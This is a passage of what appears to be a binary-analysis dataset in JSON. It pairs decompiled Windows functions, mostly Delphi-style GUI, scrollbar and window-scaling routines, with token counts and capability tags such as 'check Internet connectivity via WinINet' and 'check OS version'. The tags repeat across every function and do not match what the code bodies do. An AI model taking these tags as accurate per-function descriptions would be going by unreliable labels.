        "decompiled_code": "\nuint fcn.004547fc(void)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    \n    uVar3 = 0x100000;\n    if (*(in_EAX + 0x18) == '\\x01') {\n        uVar3 = 0x200000;\n    }\n    if (*(in_EAX + 0x1c) != '\\0') {\n        uVar1 = fcn.0044407c(0xfffffff0);\n        uVar2 = sub.user32.dll_GetWindowLongA(uVar1);\n        if ((uVar2 & uVar3) != 0) {\n            return 1;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 168
    },
    "00454834": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00454834(uint arg_8h)\n\n{\n    int16_t in_AX;\n    uint uVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    \n    uVar3 = 0x100000;\n    if (in_AX == 1) {\n        uVar3 = 0x200000;\n    }\n    uVar1 = fcn.0044407c(0xfffffff0);\n    uVar2 = sub.user32.dll_GetWindowLongA(uVar1);\n    return uVar2 & 0xffffff00 | (uVar2 & uVar3) != 0;\n}\n",
        "token_count": 143
    },
    "00454868": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00454868(int32_t arg_8h)\n\n{\n    char cVar1;\n    ushort in_DX;\n    int32_t iVar2;\n    \n    iVar2 = 0;\n    if (*(arg_8h + -5) == '\\0') {\n        if ((*(arg_8h + -6) != '\\0') && (cVar1 = fcn.00454834(arg_8h),  cVar1 == '\\0')) {\n            iVar2 = (***0x484484)(in_DX);\n            return -(iVar2 - *(arg_8h + -0xc));\n        }\n        if ((*(arg_8h + -6) == '\\0') && (cVar1 = fcn.00454834(arg_8h),  cVar1 != '\\0')) {\n            iVar2 = (***0x484484)(in_DX);\n            iVar2 = iVar2 - *(arg_8h + -0xc);\n        }\n    }\n    return iVar2;\n}\n",
        "token_count": 220
    },
    "004548e4": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t fcn.004548e4(void)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint var_ch;\n    uint var_6h;\n    \n    uVar1 = fcn.0044407c(0xfffffff0);\n    sub.user32.dll_GetWindowLongA(uVar1);\n    if (*(in_EAX + 0x18) == '\\x01') {\n        iVar2 = fcn.00454868(&stack0xfffffffc);\n        iVar3 = fcn.0043d290();\n        iVar2 = iVar2 + iVar3;\n    }\n    else {\n        iVar2 = fcn.00454868(&stack0xfffffffc);\n        iVar3 = fcn.0043d24c();\n        iVar2 = iVar2 + iVar3;\n    }\n    return iVar2;\n}\n",
        "token_count": 194
    },
    "0045497c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0045497c(int32_t arg_8h)\n\n{\n    int16_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint var_1ch;\n    uint var_18h;\n    int32_t var_4h;\n    \n    var_1ch = 0x1c;\n    var_18h = 0x10;\n    iVar1 = *(*(arg_8h + -8) + 6);\n    uVar2 = fcn.0044407c(*(*(arg_8h + -4) + 0x18) == '\\x01', &var_1ch);\n    iVar3 = (***0x484318)(uVar2);\n    iVar4 = iVar1;\n    if (iVar3 != 0) {\n        iVar4 = var_4h;\n    }\n    return iVar4;\n}\n",
        "token_count": 202
    },
    "004549dc": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004549dc(uint param_1, int32_t param_2)\n\n{\n    int16_t iVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t var_14h;\n    int32_t var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    if ((*(in_EAX + 0x1f) == '\\0') || (3 < *(param_2 + 4))) {\n    // switch table (8 cases) at 0x454bb6\n        switch(*(param_2 + 4)) {\n        case 0:\n            fcn.00454d54();\n            break;\n        case 1:\n            fcn.00454d54();\n            break;\n        case 2:\n            fcn.004548e4();\n            fcn.00454d54();\n            break;\n        case 3:\n            fcn.004548e4();\n            fcn.00454d54();\n            break;\n        case 4:\n            if (*(in_EAX + 0x14) < 0x8000) {\n                fcn.00454d54();\n            }\n            else {\n                fcn.0045497c(&stack0xfffffffc);\n                fcn.00454d54();\n            }\n            break;\n        case 5:\n            if (*(in_EAX + 0x1d) != '\\0') {\n                if (*(in_EAX + 0x14) < 0x8000) {\n                    fcn.00454d54();\n                }\n                else {\n                    fcn.0045497c(&stack0xfffffffc);\n                    fcn.00454d54();\n                }\n            }\n            break;\n        case 6:\n            fcn.00454d54();\n            break;\n        case 7:\n            fcn.00454d54();\n        }\n    }\n    else {\n        if (*(param_2 + 4) < 2) {\n            iVar3 = *(in_EAX + 0x40);\n            var_10h = *(in_EAX + 8) % iVar3;\n        }\n        else if (*(param_2 + 4) - 2 < 2) {\n            iVar3 = *(in_EAX + 0x3c);\n            var_10h = *(in_EAX + 10) % iVar3;\n        }\n        else {\n            iVar3 = 0;\n            var_10h = 0;\n        }\n        var_14h = 0;\n        for (; 0 < iVar3; iVar3 = iVar3 + -1) {\n            iVar2 = fcn.004075a0();\n            if (iVar2 - var_14h < *(in_EAX + 0x20)) {\n                sub.kernel32.dll_Sleep_1(*(in_EAX + 0x20) - (iVar2 - var_14h));\n            }\n            iVar1 = *(param_2 + 4);\n            if (iVar1 == 0) {\n                fcn.00454d54();\n            }\n            else if (iVar1 == 1) {\n                fcn.00454d54();\n            }\n            else if (iVar1 == 2) {\n                fcn.00454d54();\n            }\n            else if (iVar1 == 3) {\n                fcn.00454d54();\n            }\n            (**(**(in_EAX + 4) + 0x88))();\n            var_14h = iVar2;\n        }\n        if (0 < var_10h) {\n            iVar1 = *(param_2 + 4);\n            if (iVar1 == 0) {\n                fcn.00454d54();\n            }\n            else if (iVar1 == 1) {\n                fcn.00454d54();\n            }\n            else if (iVar1 == 2) {\n                fcn.00454d54();\n            }\n            else if (iVar1 == 3) {\n                fcn.00454d54();\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 889
    },
    "00454d54": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00454d54(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint uVar2;\n    bool bVar3;\n    \n    if ((*(*(in_EAX + 4) + 0x1c) & 2) == 0) {\n        iVar1 = *(in_EAX + 0x14);\n        if ((param_2 <= iVar1) && (iVar1 = param_2,  param_2 < 0)) {\n            iVar1 = 0;\n        }\n        bVar3 = *(in_EAX + 0x18) != '\\0';\n        if (iVar1 != *(in_EAX + 0xc)) {\n            *(in_EAX + 0xc) = iVar1;\n            if (*(in_EAX + 0x18) == '\\0') {\n                fcn.00443bfc();\n            }\n            else {\n                fcn.00443bfc();\n            }\n            if ((((*(*(in_EAX + 4) + 0x1c) & 0x10) != 0) && (iVar1 = fcn.004544bc(),  iVar1 != 0)) &&\n               (*(iVar1 + 0x250) != 0)) {\n                (**(**(iVar1 + 0x250) + 0xc))();\n            }\n        }\n        uVar2 = fcn.0044407c(bVar3);\n        iVar1 = (***0x484520)(uVar2);\n        if (iVar1 != *(in_EAX + 0xc)) {\n            uVar2 = fcn.0044407c(bVar3, *(in_EAX + 0xc), 0xffffffff);\n            (***0x48480c)(uVar2);\n        }\n    }\n    else {\n        *(in_EAX + 0xc) = param_2;\n    }\n    return;\n}\n",
        "token_count": 424
    },
    "00454ed0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00454ed0(int32_t arg_8h)\n\n{\n    char in_AL;\n    uint uVar1;\n    uint uVar2;\n    int32_t *piVar3;\n    uint uVar4;\n    uint uVar5;\n    int32_t arg_14h;\n    \n    piVar3 = arg_8h + -4;\n    arg_14h = -(in_AL != '\\0');\n    uVar4 = *(*(*piVar3 + 0x34) * 4 + 0x483e60);\n    uVar2 = *(*(*piVar3 + 0x18) * 0x14 + 0x483e38);\n    uVar1 = fcn.0044407c();\n    fcn.0042f35c(uVar1, uVar2, uVar4, arg_14h);\n    if (0 < *(*piVar3 + 0x24)) {\n        uVar5 = 0;\n        uVar4 = *(*piVar3 + 0x24);\n        uVar2 = *(*(*piVar3 + 0x18) * 0x14 + 0x483e3c);\n        uVar1 = fcn.0044407c();\n        fcn.0042f35c(uVar1, uVar2, uVar4, uVar5);\n    }\n    if (0 < *(*piVar3 + 0x38)) {\n        uVar5 = 0;\n        uVar4 = *(*piVar3 + 0x38);\n        uVar2 = *(*(*piVar3 + 0x18) * 0x14 + 0x483e40);\n        uVar1 = fcn.0044407c();\n        fcn.0042f35c(uVar1, uVar2, uVar4, uVar5);\n    }\n    if (0 < *(*piVar3 + 0x30)) {\n        uVar5 = 0;\n        uVar4 = *(*piVar3 + 0x30);\n        uVar2 = *(*(*piVar3 + 0x18) * 0x14 + 0x483e44);\n        uVar1 = fcn.0044407c();\n        fcn.0042f35c(uVar1, uVar2, uVar4, uVar5);\n    }\n    uVar5 = 0;\n    uVar2 = fcn.00425c78();\n    uVar4 = *(*(*piVar3 + 0x18) * 0x14 + 0x483e48);\n    uVar1 = fcn.0044407c();\n    fcn.0042f35c(uVar1, uVar4, uVar2, uVar5);\n    return;\n}\n",
        "token_count": 606
    },
    "00454fd8": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.00454fd8(uint param_1, uchar param_2)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uint uVar3;\n    uint32_t uVar4;\n    uint var_22h;\n    uint var_1eh;\n    uint var_1ah;\n    uint var_16h;\n    int32_t var_12h;\n    uint var_eh;\n    uint var_ah;\n    int32_t var_6h;\n    \n    *(in_EAX + 0x14) = 0;\n    cVar1 = *(in_EAX + 0x18);\n    var_6h._1_1_ = param_2;\n    unique0x100000a4 = in_EAX;\n    if (*(in_EAX + 0x1c) != '\\0') {\n        iVar2 = fcn.004548e4();\n        iVar2 = *(stack0xfffffff8 + 0x10) - iVar2;\n        *(stack0xfffffff8 + 0x14) = iVar2;\n        if (iVar2 < 0) {\n            *(stack0xfffffff8 + 0x14) = 0;\n        }\n    }\n    var_22h = 0x1c;\n    var_1eh = 0x17;\n    var_1ah = 0;\n    if (*(stack0xfffffff8 + 0x14) < 1) {\n        var_16h = 0;\n    }\n    else {\n        var_16h = *(stack0xfffffff8 + 0x10);\n    }\n    var_12h = fcn.004548e4();\n    var_12h = var_12h + 1;\n    var_eh = *(stack0xfffffff8 + 0xc);\n    var_ah = var_eh;\n    fcn.00454ed0(&stack0xfffffffc);\n    *(stack0xfffffff8 + 0x44) = 0;\n    uVar3 = fcn.0044407c(cVar1 == '\\x01', &var_22h, 0xffffffff);\n    (***0x484650)(uVar3);\n    fcn.00454d54();\n    iVar2 = fcn.004548e4();\n    uVar4 = (iVar2 * 9) / 10;\n    *(stack0xfffffff8 + 10) = uVar4;\n    if (*(stack0xfffffff8 + 0x1f) != '\\0') {\n        *(stack0xfffffff8 + 8) = (uVar4 & 0xffff) / 10;\n    }\n    return;\n}\n",
        "token_count": 597
    },
    "004551b4": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.004551b4(void)\n\n{\n    char cVar1;\n    uint arg_8h;\n    \n    fcn.00440ffc();\n    if (*(*0x484858 + 0xd) == '\\0') {\n        cVar1 = fcn.0040d15c();\n        if (cVar1 == '\\0') {\n            arg_8h = fcn.0044407c();\n            fcn.0042f390(arg_8h);\n        }\n    }\n    fcn.004553cc();\n    return;\n}\n",
        "token_count": 120
    },
    "00455234": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00455234(void)\n\n{\n    bool bVar1;\n    char cVar2;\n    int32_t in_EAX;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint *in_FS_OFFSET;\n    uint arg_8h;\n    uint var_10h;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar3 = fcn.004037f0();\n    arg_8h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd4;\n    iVar4 = fcn.0043d24c();\n    iVar5 = *(in_EAX + 0x208);\n    cVar2 = fcn.004547fc();\n    if ((cVar2 == '\\0') || (*(iVar5 + 0x10) <= iVar4)) {\n        bVar1 = false;\n    }\n    else {\n        bVar1 = true;\n    }\n    if (bVar1) {\n        fcn.00454d54();\n    }\n    iVar5 = fcn.00440d74();\n    if (-1 < iVar5 + -1) {\n        do {\n            fcn.00440d38();\n            fcn.00440d38();\n            fcn.0041c358();\n            fcn.0043cfb8();\n            iVar5 = iVar5 + -1;\n        } while (iVar5 != 0);\n    }\n    iVar5 = *(iVar3 + 8);\n    if (-1 < iVar5 + -1) {\n        do {\n            arg_8h = 0;\n            fcn.0041c4c8();\n            fcn.0043e9fc(arg_8h);\n            iVar5 = iVar5 + -1;\n        } while (iVar5 != 0);\n    }\n    if (bVar1) {\n        fcn.00454644();\n    }\n    *in_FS_OFFSET = arg_8h;\n    fcn.00403820();\n    return;\n}\n",
        "token_count": 437
    },
    "0045534c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0045534c(void)\n\n{\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 0x214) < 1) {\n        fcn.00454750();\n        fcn.00454750();\n    }\n    return;\n}\n",
        "token_count": 60
    },
    "004553cc": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.004553cc(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack20;\n    uint uStack16;\n    uchar *puStack12;\n    int32_t var_4h;\n    \n    if (*(in_EAX + 0x218) == '\\0') {\n        puStack12 = 0x4553eb;\n        var_4h = in_EAX;\n        cVar1 = fcn.00444380();\n        if (cVar1 != '\\0') {\n            uStack16 = 0x4554b7;\n            uStack20 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &stack0xffffffec;\n            *(var_4h + 0x218) = 1;\n            puStack12 = &stack0xfffffffc;\n            cVar1 = fcn.00454964();\n            if (cVar1 == '\\0') {\n                cVar1 = fcn.00454964();\n                if (cVar1 == '\\0') {\n                    fcn.00454fd8();\n                    fcn.00454fd8();\n                }\n                else {\n                    fcn.00454fd8();\n                    fcn.00454fd8();\n                }\n            }\n            else {\n                fcn.00454fd8();\n                fcn.00454fd8();\n            }\n            *in_FS_OFFSET = uStack20;\n            *(var_4h + 0x218) = 0;\n            return;\n        }\n    }\n    return;\n}\n",
        "token_count": 336
    },
    "00455ae4": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nint32_t __fastcall fcn.00455ae4(uint param_1, char param_2)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    int32_t *piVar2;\n    uint uVar3;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint var_1h;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00403b58();\n        param_2 = extraout_DL;\n    }\n    fcn.004550f0();\n    *(in_EAX + 0x50) = *0x455c58;\n    fcn.0043cfb8();\n    fcn.0043cfdc();\n    fcn.0043d004();\n    fcn.0043d028();\n    piVar2 = fcn.0042cc98();\n    *(in_EAX + 0x240) = piVar2;\n    (***0x484484)(0x31);\n    (**(*piVar2 + 0x40))();\n    (***0x484484)();\n    (**(**(in_EAX + 0x240) + 0x34))();\n    iVar1 = *(in_EAX + 0x240);\n    *(iVar1 + 0x14) = in_EAX;\n    *(iVar1 + 0x10) = fcn.00456410;\n    uVar3 = fcn.00426a54();\n    *(in_EAX + 0x238) = uVar3;\n    fcn.0043c424();\n    *(in_EAX + 0x228) = *0x455c5c;\n    *(in_EAX + 0x229) = 2;\n    *(in_EAX + 0x22b) = 0;\n    *(in_EAX + 0x231) = 3;\n    *(in_EAX + 0x244) = 0;\n    *(in_EAX + 0x25c) = *(*0x485b4c + 0x40);\n    *(in_EAX + 0x235) = 1;\n    uVar3 = fcn.00403764();\n    *(in_EAX + 0xb8) = uVar3;\n    *(in_EAX + 0x2e1) = 0xff;\n    *(in_EAX + 0x2ec) = 0;\n    fcn.00456774();\n    fcn.0043da0c();\n    fcn.0043d974();\n    fcn.004441bc();\n    fcn.0045addc();\n    *(in_EAX + 0x2e4) = 10;\n    if (param_2 != '\\0') {\n        fcn.00403bb0();\n        *in_FS_OFFSET = 0x32;\n    }\n    return in_EAX;\n}\n",
        "token_count": 643
    },
    "00455cc8": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00455cc8(void)\n\n{\n    char cVar1;\n    uchar extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    uint uStack20;\n    uchar *puStack16;\n    int32_t *var_5h;\n    \n    puStack16 = 0x455cd3;\n    *NULL = fcn.00403bc0();\n    var_5h._0_1_ = extraout_DL;\n    if ((*(*NULL + 7) & 8) == 0) {\n        puStack16 = 0x455cee;\n        (**(***0x48481c + 0x14))();\n    }\n    uStack20 = 0x455d92;\n    uStack24 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe8;\n    puStack16 = &stack0xfffffffc;\n    if (*(stack0xfffffff8 + 0x8d) != '\\0') {\n        puStack16 = &stack0xfffffffc;\n        (**(*stack0xfffffff8 + 0xd8))();\n    }\n    fcn.00458604();\n    cVar1 = fcn.00444380();\n    if (cVar1 != '\\0') {\n        (**(*stack0xfffffff8 + 0xac))();\n    }\n    fcn.0045ae14();\n    fcn.00403820();\n    fcn.00403820();\n    fcn.0040e630();\n    fcn.00455168();\n    *in_FS_OFFSET = uStack24;\n    puStack16 = 0x455d99;\n    uStack20 = 0x455d91;\n    (**(***0x48481c + 0x18))();\n    return;\n}\n",
        "token_count": 394
    },
    "00455dac": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00455dac(void)\n\n{\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_4h;\n    \n    puStack24 = &stack0xfffffffc;\n    if (*(in_EAX + 0x2d2) != 0) {\n        uStack28 = 0x455ded;\n        uStack32 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffe0;\n        (**(in_EAX + 0x2d0))();\n        *in_FS_OFFSET = uStack32;\n    }\n    if ((*(in_EAX + 0x2f4) & 2) != 0) {\n        puStack24 = 0x455e22;\n        fcn.00456774();\n    }\n    return;\n}\n",
        "token_count": 194
    },
    "00455e28": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00455e28(void)\n\n{\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_4h;\n    \n    puStack24 = &stack0xfffffffc;\n    if (*(in_EAX + 0x2da) != 0) {\n        uStack28 = 0x455e69;\n        uStack32 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &uStack32;\n        (**(in_EAX + 0x2d8))();\n        *in_FS_OFFSET = uStack32;\n    }\n    return;\n}\n",
        "token_count": 147
    },
    "00455fd0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00455fd0(void)\n\n{\n    bool bVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uint uVar3;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_4h;\n    \n    puStack20 = 0x455fe3;\n    fcn.004408d4();\n    uStack24 = 0x456238;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    *(in_EAX + 0x268) = 0;\n    *(in_EAX + 0x26c) = 0;\n    *(in_EAX + 0x270) = 0;\n    bVar1 = false;\n    puStack20 = &stack0xfffffffc;\n    iVar2 = fcn.004037ac();\n    if (iVar2 == *0x452e64) {\n        *(in_EAX + 0x234) = *0x485665 ^ 1;\n    }\n    fcn.00440030();\n    if ((*(in_EAX + 0x25c) != 0) && (0 < *(in_EAX + 0x270))) {\n        if (((*(in_EAX + 0x98) & 0x10) != 0) && (*(in_EAX + 0x25c) != *(*0x485b4c + 0x40))) {\n            uVar3 = fcn.00426318(*(*0x485b4c + 0x40), *(in_EAX + 0x25c));\n            sub.kernel32.dll_MulDiv(uVar3);\n            fcn.00426320();\n        }\n        *(in_EAX + 0x25c) = *(*0x485b4c + 0x40);\n        iVar2 = fcn.00456368();\n        if (iVar2 != *(in_EAX + 0x270)) {\n            bVar1 = true;\n            fcn.00455630();\n            fcn.00443b08();\n            if ((*(in_EAX + 0x98) & 4) != 0) {\n                uVar3 = sub.kernel32.dll_MulDiv(*(in_EAX + 0x268), iVar2, *(in_EAX + 0x270));\n                *(in_EAX + 0x268) = uVar3;\n            }\n            if ((*(in_EAX + 0x98) & 8) != 0) {\n                uVar3 = sub.kernel32.dll_MulDiv();\n                *(in_EAX + 0x26c) = uVar3;\n            }\n            if ((*(in_EAX + 0x98) & 0x20) != 0) {\n                uVar3 = sub.kernel32.dll_MulDiv(*(in_EAX + 0x1fa), iVar2, *(in_EAX + 0x270));\n                *(in_EAX + 0x1fa) = uVar3;\n                uVar3 = sub.kernel32.dll_MulDiv();\n                *(in_EAX + 0x1fe) = uVar3;\n            }\n        }\n    }\n    if (0 < *(in_EAX + 0x268)) {\n        fcn.0043d264();\n    }\n    if (0 < *(in_EAX + 0x26c)) {\n        fcn.0043d2a8();\n    }\n    *(in_EAX + 0x98) = *0x456244;\n    if (!bVar1) {\n        fcn.00455630();\n        fcn.00443b08();\n    }\n    uVar3 = 0;\n    fcn.0043e9fc(0);\n    *in_FS_OFFSET = uVar3;\n    fcn.004408dc(0x45623f);\n    return;\n}\n",
        "token_count": 859
    },
    "00456410": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00456410(void)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    uint uVar2;\n    int32_t iVar3;\n    \n    if (**0x484538 == '\\0') {\n        uVar2 = fcn.0044407c();\n        iVar3 = sub.user32.dll_IsIconic(uVar2);\n        if (iVar3 != 0) {\n            (**(*in_EAX + 0x7c))();\n        }\n    }\n    else {\n        cVar1 = fcn.00444380();\n        if ((cVar1 != '\\0') && (*(in_EAX + 0x229) != '\\x03')) {\n            uVar2 = fcn.00458778();\n            uVar2 = fcn.0044407c(0x80, 1, uVar2);\n            sub.user32.dll_SendMessageA(uVar2);\n            return;\n        }\n    }\n    return;\n}\n",
        "token_count": 209
    },
    "0045647c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.0045647c(void)\n\n{\n    int32_t in_EAX;\n    \n    if (((*(in_EAX + 0x210) == '\\0') && (*(*(in_EAX + 0x208) + 0x10) == 0)) && (*(*(in_EAX + 0x20c) + 0x10) == 0)) {\n        return 0;\n    }\n    return 1;\n}\n",
        "token_count": 97
    },
    "004567b8": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.004567b8(void)\n\n{\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack20;\n    uint uStack16;\n    uchar *puStack12;\n    uint var_4h;\n    \n    puStack12 = &stack0xfffffffc;\n    var_4h = 0;\n    uStack16 = 0x456811;\n    uStack20 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffec;\n    if ((*(in_EAX + 0x22f) == '\\x01') && (*(in_EAX + 0x57) != '\\0')) {\n        fcn.0040675c();\n        fcn.0040c8dc();\n        fcn.00403fc0();\n    }\n    *in_FS_OFFSET = uStack20;\n    puStack12 = 0x456818;\n    uStack16 = 0x456810;\n    fcn.004045c8();\n    return;\n}\n",
        "token_count": 217
    },
    "00456858": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00456858(uint arg_8h)\n\n{\n    int32_t in_EAX;\n    \n    fcn.00422bac(arg_8h);\n    if (*(in_EAX + 0x250) != 0) {\n        (**(**(in_EAX + 0x250) + 0x2c))(arg_8h);\n    }\n    return;\n}\n",
        "token_count": 86
    },
    "00456898": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
